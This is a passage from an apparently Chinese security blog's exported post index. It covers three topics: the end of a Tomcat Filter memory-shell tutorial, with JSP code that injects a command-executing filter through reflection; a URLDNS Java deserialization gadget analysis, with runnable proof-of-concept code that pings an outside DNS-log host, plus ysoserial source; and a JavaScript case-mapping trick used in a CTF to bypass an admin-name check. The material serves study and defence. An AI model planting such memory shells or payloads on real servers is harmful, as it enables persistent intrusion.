能够继续执行</span></span><br><span class="line">            filterChain.doFilter(servletRequest,servletResponse);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> <span class="string">&quot;FilterTest&quot;</span>;</span><br><span class="line">    <span class="comment">// 获取StandardContext对象</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) field.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用FilterDef对filter进行封装</span></span><br><span class="line">    <span class="type">FilterTest</span> <span class="variable">filterTest</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterTest</span>();</span><br><span class="line">    <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">    filterDef.setFilter(filterTest);</span><br><span class="line">    filterDef.setFilterName(filterName);</span><br><span class="line">    filterDef.setFilterClass(filterTest.getClass().getName());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建FilterMap，将filterName和urlPatterns进行绑定</span></span><br><span class="line">    <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">    filterMap.setFilterName(filterName);</span><br><span class="line">    filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">    filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">    standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 封装filterConfig和filterDef到filterConfigs</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">field_filterConfigs</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">    field_filterConfigs.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) field_filterConfigs.get(standardContext);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 利用反射创建FilterConfig，并且将filterDef和standardContext作为参数进行传入进行封装filterDe</span></span><br><span class="line">    <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">    constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 添加到filterConfigs中</span></span><br><span class="line">    filterConfigs.put(filterName,applicationFilterConfig);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></p><p>访问上传的内存马文件路径使其执行代码，注册内存马<br><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031172346671.png" alt="image-20221031172346671"></p><p>接着访问其他路由都可以成功执行命令<br><img src="/2021/11/10/Filter%E5%86%85%E5%AD%98%E9%A9%AC/image-20221031172405231.png" alt="image-20221031172405231"></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java项目杂事</title>
      <link href="/2021/11/10/README/"/>
      <url>/2021/11/10/README/</url>
      
        <content type="html"><![CDATA[<h1 id="介绍一些nodejs中的安全问题"><a href="#介绍一些nodejs中的安全问题" class="headerlink" title="介绍一些nodejs中的安全问题"></a>介绍一些nodejs中的安全问题</h1>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>URLNDS利用链分析</title>
      <link href="/2021/11/10/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/"/>
      <url>/2021/11/10/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<h1 id="URLDNS利用链分析"><a href="#URLDNS利用链分析" class="headerlink" title="URLDNS利用链分析"></a>URLDNS利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>URLDNS</code>是相对于其他利用链较为简单的一条<code>gadget</code>利用链，由于<code>URLDNS</code>不依赖与其他第三方库，且不限制<code>jdk</code>版本，所以常常用来检测程序是否存在反序列化漏洞。</p><p><code>URLDNS</code>的特点：只能发送<code>DNS</code>请求，不能执行其他任何命令。</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>问题出在<code>HashMap</code>的<code>readObject()</code>方法中，我们看一下源码，在最后传进的<code>putVal()</code>方法中对<code>key</code>进行了<code>hash()</code>计算<br><img src="/2021/11/10/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/image-20220918225012617.png" alt="image-20220918225012617"></p><p>跟进<code>hash()</code>方法，接着会调用传进来的<code>key</code>的<code>hashCode()</code>的方法<br><img src="/2021/11/10/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/image-20220918231235822.png" alt="image-20220918231235822"></p><p>因为我们传进来的<code>key</code>是<code>URL</code>对象，因此接着跟进<code>URL</code>类的<code>hashCode()</code>方法，这里对<code>hackCode</code>参数的值进行了判断，需要满足等于<code>-1</code>的条件<br><img src="/2021/11/10/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/image-20220918231432956.png" alt="image-20220918231432956"></p><p>继续跟进<code>hashCode = handler.hashCode(this);</code>中的<code>hashCode()</code>方法，该方法里面调用了<code>getHostAddress()</code>方法<br><img src="/2021/11/10/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/image-20220918231623683.png" alt="image-20220918231623683"></p><p>继续跟进<code>getHostAddress()</code>方法，发现调用了<code>InetAddress.getByName(host);</code>方法<br><img src="/2021/11/10/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/image-20220918231719742.png" alt="image-20220918231719742"></p><p><code>InetAddress.getByName(host)</code>：只需要传入目标主机的名字，<code>InetAddress</code>会尝试做连接DNS服务器，并且获取IP地址的操作。</p><p>因此在此处发起了一次<code>DNS</code>请求，总结<code>URLDNS</code>利用链如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashMap --&gt; readObject()</span><br><span class="line">HashMap --&gt; putVal()</span><br><span class="line">HashMap --&gt; hash()</span><br><span class="line">URL     --&gt; hashCode()</span><br><span class="line">URLStreamHandler --&gt; hashCode()</span><br><span class="line">URLStreamHandler --&gt; getHostAddress()</span><br><span class="line">InetAddress      --&gt; InetAddress.getByName()</span><br></pre></td></tr></table></figure></p><p>构造 POC 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/18 22:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URLDNS</span> <span class="variable">urldns</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLDNS</span>();</span><br><span class="line">        urldns.serialize();</span><br><span class="line">        urldns.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://c62a1767.dns.1433.eu.org&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>成功发送了 DNS 请求<br><img src="/2021/11/10/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/image-20220918232949145.png" alt="image-20220918232949145"></p><h2 id="为什么发送了两次请求？"><a href="#为什么发送了两次请求？" class="headerlink" title="为什么发送了两次请求？"></a>为什么发送了两次请求？</h2><p>可以看到上图中的结果显示一共发送了两次请求，调试后发现<code>HashMap.put()</code>方法也会调用一次<code>putVal()</code>方法<br><img src="/2021/11/10/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/image-20220918233144243.png" alt="image-20220918233144243"></p><p>为了规避实际环境中产生误判的情况，我们需要消除掉这一次多余的<code>DNS</code>请求。</p><p>我们在<code>put()</code>方法前先设置<code>hashCode</code>字段值不为<code>-1</code>就可以不进入<code>hashCode = handler.hashCode(this);</code>语句里，就可避免发送<code>DNS</code>请求。</p><p>最终 POC 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/18 22:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URLDNS</span> <span class="variable">urldns</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLDNS</span>();</span><br><span class="line">        urldns.serialize();</span><br><span class="line">        urldns.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://4b9cc854.dns.1433.eu.org&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashCode.set(url, <span class="number">666</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2021/11/10/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/image-20220918233654716.png" alt="image-20220918233654716"></p><h2 id="ysoserial的实现"><a href="#ysoserial的实现" class="headerlink" title="ysoserial的实现"></a>ysoserial的实现</h2><p><code>ysoserial</code>是<code>java</code>反序列化利用链的集合工具，可以根据我们需要的利用链生成反序列 POC。项目地址：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/frohoff/ysoserial</span><br></pre></td></tr></table></figure><p>下载源代码后导入 idea，根据<code>pom.xml</code>文件中的引导设置<code>GeneratePayload.java</code>文件为<code>mainClass</code><br><img src="/2021/11/10/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/image-20220919172929224.png" alt="image-20220919172929224"></p><p>设置<code>URLDNS</code>的运行参数<img src="/2021/11/10/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/image-20220919173043221.png" alt="image-20220919173043221"></p><p>其中<code>URLDNS</code>利用链部分的实现源码如下（删除部分不重要的内容）：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>简化后如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"><span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); </span><br><span class="line"><span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line">ht.put(u, url); </span><br><span class="line">Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); </span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line">  <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>利用链如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line"> *     HashMap.readObject()</span><br><span class="line"> *       HashMap.putVal()</span><br><span class="line"> *         HashMap.hash()</span><br><span class="line"> *           URL.hashCode()</span><br></pre></td></tr></table></figure></p><p>可以看到<code>ysoserial</code>直接继承<code>URLStreamHandler</code>类重写了<code>getHostAddress()</code>方法为空，因此避免了在生成<code>payload</code>的时候发起<code>DNS</code>请求。</p><p><strong>那为什么反序列化后还能发送<code>DNS</code>请求？</strong></p><p>可以看到在<code>java.net.URL</code>类中<code>handler</code>参数被<code>transient</code>关键字修饰<br><img src="/2021/11/10/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/image-20220919182207942.png" alt="image-20220919182207942"></p><blockquote><p>一旦变量被transient修饰，变量将不再是对象持久化的一部分，该变量内容在序列化后无法获得访问（被忽略）</p></blockquote><p>因此在序列化的过程中会忽略掉<code>handler</code>，在反序列化时能正常执行<code>DNS</code>请求。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java大小写特性</title>
      <link href="/2021/11/10/javascript%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7/"/>
      <url>/2021/11/10/javascript%E5%A4%A7%E5%B0%8F%E5%86%99%E7%89%B9%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h1 id="javascript大小写特性"><a href="#javascript大小写特性" class="headerlink" title="javascript大小写特性"></a>javascript大小写特性</h1><p>在javascript中有几个特殊的字符需要记录一下</p><p>对于<code>toUpperCase()</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符&quot;ı&quot;、&quot;ſ&quot; 经过toUpperCase处理后结果为 &quot;I&quot;、&quot;S&quot;</span><br></pre></td></tr></table></figure><p>对于<code>toLowerCase()</code>:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">字符&quot;K&quot;经过toLowerCase处理后结果为&quot;k&quot;(这个K不是K)</span><br></pre></td></tr></table></figure><p>在绕一些规则的时候就可以利用这几个特殊字符进行绕过</p><h2 id="CTF题实例-Hacktm中的一道Nodejs题"><a href="#CTF题实例-Hacktm中的一道Nodejs题" class="headerlink" title="CTF题实例 - Hacktm中的一道Nodejs题"></a><strong>CTF题实例 - Hacktm中的一道Nodejs题</strong></h2><p>题目部分源码：</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">isValidUser</span>(<span class="params">u</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> (</span><br><span class="line">    u.<span class="property">username</span>.<span class="property">length</span> &gt;= <span class="number">3</span> &amp;&amp;</span><br><span class="line">    u.<span class="property">username</span>.<span class="title function_">toUpperCase</span>() !== config.<span class="property">adminUsername</span>.<span class="title function_">toUpperCase</span>()</span><br><span class="line">  );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">isAdmin</span>(<span class="params">u</span>) &#123;</span><br><span class="line">  <span class="keyword">return</span> u.<span class="property">username</span>.<span class="title function_">toLowerCase</span>() == config.<span class="property">adminUsername</span>.<span class="title function_">toLowerCase</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解题时需要登录管理员的用户名，但是在登录时，<code>isValidUser</code>函数会对用户输入的用户名进行<code>toUpperCase</code>处理，再与管理员用户名进行对比。如果输入的用户名与管理员用户名相同，就不允许登录。</p><p>但是我们可以看到，在之后的一个判断用户是否为管理员的函数中，对用户名进行处理的是<code>toLowerCase</code>。所以这两个差异，就可以使用大小写特性来进行绕过。</p><p>题目中默认的管理员用户名为：hacktm</p><p>所以，我们指定登录时的用户名为：hacKtm 即可绕过<code>isValidUser</code>和<code>isAdmin</code>的验证。</p><p>题目完整Writeup:<a href="https://xz.aliyun.com/t/7177">HackTM中一道Node.js题分析(Draw with us)</a></p><h2 id="MMCTF"><a href="#MMCTF" class="headerlink" 